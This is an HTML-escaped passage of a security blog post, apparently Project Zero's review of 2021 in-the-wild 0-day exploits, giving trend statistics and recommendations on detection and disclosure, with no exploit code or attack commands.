\"}ol.lst-kix_czzguda5pqu4-8{list-style-type:none}.lst-kix_718o7hzyu4f-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_jdourvkzhmg1-0.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-0 0}ol.lst-kix_czzguda5pqu4-4.start{counter-reset:lst-ctn-kix_czzguda5pqu4-4 0}.lst-kix_h2vtkcla8l9d-0&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-0,decimal) \". \"}.lst-kix_jdourvkzhmg1-7&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-7,lower-latin) \". \"}ol.lst-kix_qhs0t3wlsx02-5.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-5 0}.lst-kix_jdourvkzhmg1-0&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-0}.lst-kix_h2vtkcla8l9d-4&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-4,lower-latin) \". \"}.lst-kix_jdourvkzhmg1-3&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-3,decimal) \". \"}.lst-kix_rvy0q9fw47sg-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_h2vtkcla8l9d-2&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-2,lower-roman) \". \"}.lst-kix_h2vtkcla8l9d-6&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-6,decimal) \". \"}.lst-kix_rvy0q9fw47sg-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_jdourvkzhmg1-1&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-1}.lst-kix_3zaknyhdqv25-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_jdourvkzhmg1-5&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-5,lower-roman) \". \"}.lst-kix_qhs0t3wlsx02-1&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-1}.lst-kix_3zaknyhdqv25-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_3zaknyhdqv25-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_bqyk3pvm93qj-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h2vtkcla8l9d-8&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-8,lower-roman) \". \"}.lst-kix_czzguda5pqu4-4&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-4}.lst-kix_3zaknyhdqv25-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_jdourvkzhmg1-1&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-1,lower-latin) \". \"}.lst-kix_rwsfzn4jdl6v-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_czzguda5pqu4-1.start{counter-reset:lst-ctn-kix_czzguda5pqu4-1 0}.lst-kix_rvy0q9fw47sg-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_9i24fh2252ug-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9i24fh2252ug-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_rwsfzn4jdl6v-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_rvy0q9fw47sg-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_1mxsacho6zj1-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_3zaknyhdqv25-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_9i24fh2252ug-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_givsp5ka59r-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_qhs0t3wlsx02-8{list-style-type:none}.lst-kix_1mxsacho6zj1-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_givsp5ka59r-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_givsp5ka59r-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_grz5i5wr9ig-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_1mxsacho6zj1-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_rwsfzn4jdl6v-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_qhs0t3wlsx02-3{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-2.start{counter-reset:lst-ctn-kix_czzguda5pqu4-2 0}ol.lst-kix_qhs0t3wlsx02-0{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-7{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-6{list-style-type:none}.lst-kix_rwsfzn4jdl6v-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_qhs0t3wlsx02-5{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-4 0}ol.lst-kix_czzguda5pqu4-3.start{counter-reset:lst-ctn-kix_czzguda5pqu4-3 0}.lst-kix_rwsfzn4jdl6v-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_czzguda5pqu4-8&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-8,lower-roman) \". \"}.lst-kix_qhs0t3wlsx02-0&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_czzguda5pqu4-6&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-6,decimal) \". \"}.lst-kix_knibgsincpme-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_czzguda5pqu4-0&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-0,decimal) \". \"}.lst-kix_czzguda5pqu4-4&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-4,lower-latin) \". \"}.lst-kix_knibgsincpme-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_h2vtkcla8l9d-5&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-5}.lst-kix_qhs0t3wlsx02-6&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-6}.lst-kix_czzguda5pqu4-3&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-3}.lst-kix_czzguda5pqu4-2&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-2,lower-roman) \". \"}ol{margin:0;padding:0}table td,table th{padding:0}.HNYIspzEBn-c4{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c11{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:\"Arial\";font-style:normal}.HNYIspzEBn-c16{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:\"Arial\";font-style:normal}.HNYIspzEBn-c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:italic}.HNYIspzEBn-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.HNYIspzEBn-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.HNYIspzEBn-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.HNYIspzEBn-c18{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c1{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HNYIspzEBn-c10{font-family:Consolas,\"Courier New\";color:#0d904f;font-weight:400}.HNYIspzEBn-c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HNYIspzEBn-c3{color:inherit;text-decoration:inherit}.HNYIspzEBn-c6{padding:0;margin:0}.HNYIspzEBn-c9{font-weight:700;font-style:italic}.HNYIspzEBn-c17{font-weight:700}.HNYIspzEBn-c14{font-style:italic}.HNYIspzEBn-c15{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"HNYIspzEBn-c19\"&gt;\n &lt;p class=\"c18 subtitle\" id=\"h.bcdrmuya7iqp\"&gt;&lt;span class=\"HNYIspzEBn-c16\"&gt;A Year in Review of 0-days Used In-the-Wild in 2021&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Posted by Maddie Stone, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;This is our third annual year in review of 0-days exploited in-the-wild [&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html\"&gt;2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html\"&gt;2019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;]. Each year we&amp;rsquo;ve looked back at all of the detected and disclosed in-the-wild 0-days as a group and synthesized what we think the trends and takeaways are. The goal of this report is not to detail each individual exploit, but instead to analyze the exploits from the year as a group, looking for trends, gaps, lessons learned, successes, etc. If you&amp;rsquo;re interested in the analysis of individual exploits, please check out our &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/p/rca.html\"&gt;root cause analysis repository&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;We perform and share this analysis in order to &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c17\"&gt;make 0-day hard&lt;/span&gt;&lt;span&gt;. We want it to be more costly, more resource intensive, and overall more difficult for attackers to use 0-day capabilities. 2021 highlighted just how important it is to stay relentless in our pursuit to make it harder for attackers to exploit users with 0-days. We heard &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://forbiddenstories.org/about-the-pegasus-project/\"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/\"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;about how governments were targeting journalists, minoritized populations, politicians, human rights defenders, and even security researchers around the world. The decisions we make in the security and tech communities can have real impacts on society and our fellow humans&amp;rsquo; lives.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;We&amp;rsquo;ll provide our evidence and process for our conclusions in the body of this post, and then wrap it all up with our thoughts on next steps and hopes for 2022 in the conclusion. If digging into the bits and bytes is not your thing, then feel free to just check-out the Executive Summary and Conclusion.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"HNYIspzEBn-c11\" id=\"h.tf3r1j8la9a4\"&gt;&lt;span class=\"HNYIspzEBn-c13\"&gt;Executive Summary&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;2021 included the detection and disclosure of &lt;/span&gt;&lt;span&gt;58&lt;/span&gt;&lt;span&gt;&amp;nbsp;in-the-wild 0-days, the most ever recorded since Project Zero began tracking in mid-2014. That&amp;rsquo;s more than double the previous maximum of 28 detected in 2015 and especially stark when you consider that there were only 25 detected in 2020. We&amp;rsquo;ve tracked publicly known in-the-wild 0-day exploits in &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=0\"&gt;this spreadsheet&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;since mid-2014.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;While we often talk about the number of 0-day exploits &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c9\"&gt;used&lt;/span&gt;&lt;span&gt;&amp;nbsp;in-the-wild, what we&amp;rsquo;re actually discussing is the number of 0-day exploits &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c9\"&gt;detected and disclosed&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c14\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;as in-the-wild. And that leads into our first conclusion: we believe the large uptick in in-the-wild 0-days in 2021 is due to increased detection and disclosure of these 0-days, rather than simply increased usage of 0-day exploits.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;With this record number of in-the-wild 0-days to analyze we saw that attacker methodology hasn&amp;rsquo;t actually had to change much from previous years&lt;/span&gt;&lt;span&gt;. Attackers are having success using the same bug patterns and exploitation techniques and going after the same attack surfaces. Project Zero&amp;rsquo;s mission is &amp;ldquo;make 0day hard&amp;rdquo;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;0-day will be harder when, overall, attackers are not able to use public methods and techniques for developing their 0-day exploits. When we look over these 58 0-days used in 2021, what we see instead are 0-days that are similar to previous &amp;amp; publicly known vulnerabilities. Only two 0-days stood out as novel: one for the technical sophistication of its exploit and the other for its use of logic bugs to escape the sandbox.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;So while we recognize the industry&amp;rsquo;s improvement in the detection and disclosure of in-the-wild 0-days, we also acknowledge that there&amp;rsquo;s a lot more improving to be done.&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;Having access to more &amp;ldquo;ground truth&amp;rdquo; of how attackers are actually using 0-days shows us that they are able to have success by using previously known techniques and methods rather than having to invest in developing novel techniques. This is a clear area of opportunity for the tech industry.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;We had so many more data points in 2021 to learn about attacker behavior than we&amp;rsquo;ve had in the past. Having all this data, though, has left us with even more questions than we had before. &lt;/span&gt;&lt;span&gt;Unfortunately, attackers who actively use 0-day exploits do not share the 0-days they&amp;rsquo;re using or what percentage of 0-days we&amp;rsquo;re missing in our tracking, so we&amp;rsquo;ll never know exactly what proportion of 0-days are currently being found and disclosed publi&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;cly. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Based on our analysis of the 2021 0-days we hope to see the following progress in 2022 in order to continue taking steps towards making 0-day hard:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c6 lst-kix_jdourvkzhmg1-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;All vendors agree to disclose the in-the-wild exploitation status of vulnerabilities in their security bulletins.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Exploit samples or detailed technical descriptions of the exploits are shared more widely.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.Launch mitigations that will significantly impact the exploitability of memory corruption vulnerabilities.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h1 class=\"HNYIspzEBn-c11\" id=\"h.ka5ptbumk5o1\"&gt;&lt;span class=\"HNYIspzEBn-c13\"&gt;A Record Year for In-the-Wild 0-days&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;2021 was a record year for in-the-wild 0-days. So what happened?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;\n\n   \n   &lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s1200/image1%287%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s1200/image1%287%29.png\" border=\"0\" alt=\"bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px;\"title=\"bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Is it that software security is getting worse? Or is it that attackers are using 0-day exploits more? Or has our ability to detect and disclose 0-days increased? When looking at the significant uptick from 2020 to 2021, we think it&amp;#39;s mostly explained by the latter. While we believe there has been a steady growth in interest and investment in 0-day exploits by attackers in the past several years, and that security still needs to urgently improve, it appears that the security industry&amp;#39;s ability to detect and disclose in-the-wild 0-day exploits is the primary explanation for the increase in observed 0-day exploits in 2021.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;While we often talk about &amp;ldquo;0-day exploits &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c9\"&gt;used &lt;/span&gt;&lt;span&gt;in-the-wild&amp;rdquo;, what we&amp;rsquo;re actually tracking are &amp;ldquo;0-day exploits &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c9\"&gt;detected and disclosed&lt;/span&gt;&lt;span&gt;&amp;nbsp;as used in-the-wild&amp;rdquo;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;There are more factors than just the &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c9\"&gt;use&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c14\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;that contribute to an increase in that number, most notably: detection and disclosure. Better detection of 0-day exploits and more transparently disclosed exploited 0-day vulnerabilities is a positive indicator for security and progress in the industry. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Overall, we can break down the uptick in the number of in-the-wild 0-days into:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_rwsfzn4jdl6v-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;More detection of in-the-wild 0-day exploits&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;More public disclosure of in-the-wild 0-day exploitation&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.irhic7h0695k\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;More detection&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html\"&gt;2019 Year in Review&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we wrote about the &amp;ldquo;Detection Deficit&amp;rdquo;. We stated &amp;ldquo;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c17\"&gt;As a community, our ability to detect 0-days being used in the wild is severely lacking to the point that we can&amp;rsquo;t draw significant conclusions due to the lack of (and biases in) the data we have collected&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;.&amp;rdquo; In the last two years, we believe that there&amp;rsquo;s been progress on this gap. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Anecdotally, we hear from more people that they&amp;rsquo;ve begun working more on detection of 0-day exploits. Quantitatively, while a &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c14\"&gt;very&lt;/span&gt;&lt;span&gt;&amp;nbsp;rough measure, we&amp;rsquo;re also seeing the number of entities credited with reporting in-the-wild 0-days increasing. I&lt;/span&gt;&lt;span&gt;t stands to reason that if the number of people working on trying to find 0-day exploits increases, then the number of in-the-wild 0-day exploits detected may increase.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMbFpoEKSSn5AbAzsovaZ0yN6_OFXo9u4hpDCXJBpro8LRUWJlVQ9CSqtzT2V9ohrhOvP3_RnrYsOzFGPK0FZGJmW2713g2vVW82ReJVXpjAZc57BCxtHg8i-6AdR_ThDZB6UKvzAKekbmAkuUBliMyDyWSBW87z4ZZQJC3KX-_ptZIHveotLGoJ9I/s1200/image5%284%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMbFpoEKSSn5AbAzsovaZ0yN6_OFXo9u4hpDCXJBpro8LRUWJlVQ9CSqtzT2V9ohrhOvP3_RnrYsOzFGPK0FZGJmW2713g2vVW82ReJVXpjAZc57BCxtHg8i-6AdR_ThDZB6UKvzAKekbmAkuUBliMyDyWSBW87z4ZZQJC3KX-_ptZIHveotLGoJ9I/s1200/image5%284%29.png\" border=\"0\" alt=\"A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px;\"title=\"A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRS0t_2Bwvc3U_EIr5h7NcWpQyjzHCPb4OMiDpzPxPs587otAEj8bzwch8UMFlgKchwdSq4L_PXRn1O6KGLHUl4X9voLBdZJNQsgQyJcMCVB4Y8-aRHaXRpOYZw7KVtyNYwdWpwX8ILUV1fyG2kDsXVWORsSPUBGVTON90gWf9POhhxA4edxNe1eoV/s1200/image2%285%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img 